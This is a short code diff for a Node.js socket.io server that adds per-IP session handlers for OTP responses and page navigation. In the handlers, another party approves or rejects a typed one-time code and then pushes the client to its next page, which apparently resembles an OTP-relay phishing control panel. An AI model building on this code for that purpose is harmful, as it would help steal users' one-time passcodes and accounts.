@@ -368,13 +368,37 @@ io.on('connection', (socket, req) => {
     })
 
     socket.on('sendOTPResponse', (data) => {
-        if(data.res == 'good'){
-             io.to(data.ip).emit('OTPResponse', {res:true})
-        } else {
-             io.to(data.ip).emit('OTPResponse', {res:false})
+        if (sessionStore.has(userIP)) {
+            let userDetails = sessionStore.get(userIP);
+            if(data.res == 'good'){
+                io.to(data.ip).emit('OTPResponse', {res:true, next: userDetails.getUserDataNavig.next})
+           } else {
+                io.to(data.ip).emit('OTPResponse', {res:false, next: userDetails.getUserDataType.navig})
+           }
         }
     })
 
+    socket.on('nextNavig', (data) => {
+        if (sessionStore.has(userIP)) {
+            let userDetails = sessionStore.get(userIP);
+            if(!userDetails.getUserDataNavig){
+                userDetails.getUserDataNavig = {};
+            }
+
+            userDetails.getUserDataNavig = data
+        }
+    })
+
+    socket.on('typeOTP', (data) => {
+        if (sessionStore.has(userIP)) {
+            let userDetails = sessionStore.get(userIP);
+            if(!userDetails.getUserDataType){
+                userDetails.getUserDataType = {};
+            }
+
+            userDetails.getUserDataType = data
+        }
+    })
     
     socket.on('submit', (data) => {
         if (sessionStore.has(userIP)) {
